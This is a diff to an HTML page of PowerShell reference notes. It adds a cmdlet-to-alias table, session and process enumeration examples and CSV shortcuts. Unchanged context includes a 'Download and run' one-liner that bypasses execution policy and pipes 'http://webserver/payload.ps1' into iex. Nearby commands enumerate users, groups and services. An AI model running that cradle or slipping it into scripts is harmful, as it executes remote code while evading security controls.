@@ -47,7 +47,7 @@
 <div class="section" id="basic-powershell-commands">
 <h2>Basic PowerShell commands<a class="headerlink" href="#basic-powershell-commands" title="Permalink to this headline">¶</a></h2>
 <ul>
-<li><p class="first"><code class="docutils literal notranslate"><span class="pre">sls</span></code> (<code class="docutils literal notranslate"><span class="pre">Select-String</span></code>): look for a pattern:</p>
+<li><p class="first"><code class="docutils literal notranslate"><span class="pre">sls</span></code> (<code class="docutils literal notranslate"><span class="pre">Select-String</span></code>): look for a pattern.</p>
 <p>Example:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># Search my-needle in the input</span>
 sls my-needle
@@ -62,7 +62,7 @@ sls -Path *.txt -Pattern my-needle
 <li><a class="reference external" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_regular_expressions?view=powershell-6">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_regular_expressions?view=powershell-6</a></li>
 </ul>
 </li>
-<li><p class="first"><code class="docutils literal notranslate"><span class="pre">gcm</span></code> (<code class="docutils literal notranslate"><span class="pre">Get-Command</span></code>): List cmdlets (PowerShell commands) matching a pattern</p>
+<li><p class="first"><code class="docutils literal notranslate"><span class="pre">gcm</span></code> (<code class="docutils literal notranslate"><span class="pre">Get-Command</span></code>): List cmdlets (PowerShell commands) matching a pattern.</p>
 <p>Example:</p>
 <div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="c1"># List commands using &quot;WMI&quot; in their names</span>
 gcm -noun *WMI*
@@ -70,12 +70,156 @@ gcm -noun *WMI*
 </div>
 </li>
 </ul>
+<p>PowerShell also provides commands to browse the filesystem.
+Here is a correspondence table between PowerShell commands and commands from other systems, that are also available in PowerShell as aliases:</p>
+<table border="1" class="docutils">
+<colgroup>
+<col width="21%" />
+<col width="8%" />
+<col width="16%" />
+<col width="17%" />
+<col width="39%" />
+</colgroup>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head" rowspan="2">cmdlet</th>
+<th class="head" colspan="3">Aliases</th>
+<th class="head" rowspan="2">Description</th>
+</tr>
+<tr class="row-even"><th class="head">PS</th>
+<th class="head"><code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code></th>
+<th class="head">UNIX shell</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Get-Location</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">gl</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">pwd</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">pwd</span></code></td>
+<td>Get the current node.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Set-Location</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">sl</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">cd</span></code>, <code class="docutils literal notranslate"><span class="pre">chdir</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">cd</span></code>, <code class="docutils literal notranslate"><span class="pre">chdir</span></code></td>
+<td>Change the current node.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Get-ChildItem</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">gci</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">dir</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">ls</span></code></td>
+<td>List the objects stored at the current node.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">New-Item</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">ni</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">md</span></code>, <code class="docutils literal notranslate"><span class="pre">mkdir</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">mkdir</span></code></td>
+<td>Create a directory.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Get-Item</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">gi</span></code></td>
+<td>&#160;</td>
+<td>&#160;</td>
+<td>Return the properties of the current item.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Set-Item</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">si</span></code></td>
+<td>&#160;</td>
+<td>&#160;</td>
+<td>Define the content of an item.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Copy-Item</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">cpi</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">copy</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">cp</span></code></td>
+<td>Copy an object.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Move-Item</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">mi</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">move</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">mv</span></code></td>
+<td>Move an object.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Rename-Item</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">rni</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">rn</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">ren</span></code></td>
+<td>Rename an object.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Remove-Item</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">ri</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">del</span></code>, <code class="docutils literal notranslate"><span class="pre">rd</span></code>,
+<code class="docutils literal notranslate"><span class="pre">erase</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">rm</span></code>, <code class="docutils literal notranslate"><span class="pre">rmdir</span></code></td>
+<td>Remove an object.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Get-Content</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">gc</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">type</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">cat</span></code></td>
+<td>Get the content of an object.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Set-Content</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">sc</span></code></td>
+<td>&#160;</td>
+<td>&#160;</td>
+<td>Define the content of an object.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Get-ItemProperty</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">gp</span></code></td>
+<td>&#160;</td>
+<td>&#160;</td>
+<td>Return a property.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Copy-ItemProperty</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">cpp</span></code></td>
+<td>&#160;</td>
+<td>&#160;</td>
+<td>Copy a property.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Move-ItemProperty</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">mp</span></code></td>
+<td>&#160;</td>
+<td>&#160;</td>
+<td>Move a property.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Rename-ItemProperty</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">rnp</span></code></td>
+<td>&#160;</td>
+<td>&#160;</td>
+<td>Rename a property.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Compare-Object</span></code></td>
+<td>&#160;</td>
+<td><code class="docutils literal notranslate"><span class="pre">compare</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">diff</span></code></td>
+<td>Compare several objects.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Write-Output</span></code></td>
+<td>&#160;</td>
+<td><code class="docutils literal notranslate"><span class="pre">write</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">echo</span></code></td>
+<td>Print something to the standard output.</td>
+</tr>
+<tr class="row-odd"><td><code class="docutils literal notranslate"><span class="pre">Invoke-WebRequest</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">iwr</span></code></td>
+<td>&#160;</td>
+<td><code class="docutils literal notranslate"><span class="pre">curl</span></code>, <code class="docutils literal notranslate"><span class="pre">wget</span></code></td>
+<td>Perform a HTTP request.</td>
+</tr>
+<tr class="row-even"><td><code class="docutils literal notranslate"><span class="pre">Get-Help</span></code></td>
+<td>&#160;</td>
+<td><code class="docutils literal notranslate"><span class="pre">help</span></code></td>
+<td><code class="docutils literal notranslate"><span class="pre">man</span></code></td>
+<td>Get the help associated with a cmdlet.</td>
+</tr>
+</tbody>
+</table>
 </div>
 <div class="section" id="download-and-run">
 <h2>Download and run<a class="headerlink" href="#download-and-run" title="Permalink to this headline">¶</a></h2>
 <p>Download and run a script</p>
 <ul>
-<li><p class="first">PowerShell:</p>
+<li><p class="first">PowerShell (<code class="docutils literal notranslate"><span class="pre">iex</span></code> is an alias to <code class="docutils literal notranslate"><span class="pre">Invoke-Expression</span></code>):</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">exec</span> <span class="n">bypass</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http://webserver/payload.ps1&#39;)|iex&quot;</span>
 </pre></div>
 </div>
@@ -173,6 +317,10 @@ net group
 <span class="c1"># query command</span>
 query user
 
+<span class="c1"># Get information about the current sessions on a server</span>
+qwinsta
+query session
+
 <span class="c1"># PowerShell, with MS Exchange cmdlet</span>
 <span class="c1"># Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010</span>
 Get-User <span class="p">|</span> Export-CSV C:<span class="se">\T</span>emp<span class="se">\A</span>llUsers.csv -NoTypeInfo
@@ -190,10 +338,12 @@ Get-CimInstance -ClassName Win32_Group
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">tasklist</span> <span class="o">/</span><span class="n">v</span>
 <span class="n">query</span> <span class="n">process</span> <span class="o">*</span>
 <span class="n">Get</span><span class="o">-</span><span class="n">Process</span>
+<span class="c1"># &quot;gps&quot; and &quot;ps&quot; are aliases of Get-Process</span>
 </pre></div>
 </div>
 <p>Enumerate all services:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Get</span><span class="o">-</span><span class="n">Service</span> <span class="o">|</span> <span class="n">Export</span><span class="o">-</span><span class="n">CSV</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">AllServices</span><span class="o">.</span><span class="n">csv</span> <span class="o">-</span><span class="n">NoTypeInfo</span>
+<span class="n">gsv</span> <span class="o">|</span> <span class="n">epcsv</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Temp</span>\<span class="n">AllServices</span><span class="o">.</span><span class="n">csv</span> <span class="o">-</span><span class="n">NoTypeInfo</span>
 </pre></div>
 </div>
 </div>
@@ -259,10 +409,12 @@ Get-CimInstance -ClassName Win32_Group
 <h2>CSV and table viewer<a class="headerlink" href="#csv-and-table-viewer" title="Permalink to this headline">¶</a></h2>
 <p>Display a simple CSV file in a simple GUI, from a PowerShell prompt:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Import</span><span class="o">-</span><span class="n">Csv</span> <span class="o">-</span><span class="n">Path</span> <span class="n">file</span><span class="o">.</span><span class="n">csv</span> <span class="o">|</span> <span class="n">Out</span><span class="o">-</span><span class="n">GridView</span>
+<span class="n">ipcsv</span> <span class="o">-</span><span class="n">Path</span> <span class="n">file</span><span class="o">.</span><span class="n">csv</span> <span class="o">|</span> <span class="n">ogv</span>
 </pre></div>
 </div>
 <p>In order to produce a CSV from a PowerShell command:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">...</span> <span class="o">|</span> <span class="n">Sort</span><span class="o">-</span><span class="n">Object</span> <span class="o">-</span><span class="n">Property</span> <span class="n">Timestamp</span> <span class="o">|</span> <span class="n">Export</span><span class="o">-</span><span class="n">Csv</span> <span class="n">file</span><span class="o">.</span><span class="n">csv</span> <span class="o">-</span><span class="n">notypeinformation</span>
+<span class="o">...</span> <span class="o">|</span> <span class="n">sort</span> <span class="o">-</span><span class="n">Property</span> <span class="n">Timestamp</span> <span class="o">|</span> <span class="n">epcsv</span> <span class="n">file</span><span class="o">.</span><span class="n">csv</span> <span class="o">-</span><span class="n">notypeinformation</span>
 </pre></div>
 </div>
 <p>For a table in the CLI:</p>
@@ -327,6 +479,11 @@ Get-CimInstance -ClassName Win32_Group
     <span class="nv">$SqlAdapter</span>.Fill<span class="o">(</span><span class="nv">$DataSet</span><span class="o">)</span>
     <span class="nv">$DataSet</span>.Tables<span class="o">[</span><span class="m">0</span><span class="o">]</span> <span class="p">|</span> Export-Csv <span class="nv">$csvName</span> -notypeinformation
 <span class="o">}</span>
+</pre></div>
+</div>
+<p>On a SQL Server, it is also possible to create a virtual drive (cf. <a class="reference external" href="https://docs.microsoft.com/en-us/sql/powershell/navigate-sql-server-powershell-paths?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/powershell/navigate-sql-server-powershell-paths?view=sql-server-2017</a>):</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>New-PSDrive -Name MYDB -Root SQLSERVER:<span class="se">\S</span>QL<span class="se">\l</span>ocalhost<span class="se">\D</span>EFAULT<span class="se">\D</span>atabases<span class="se">\m</span>ydb
+Set-Location MYDB:<span class="se">\T</span>ables<span class="se">\U</span>sers
 </pre></div>
 </div>
 </div>
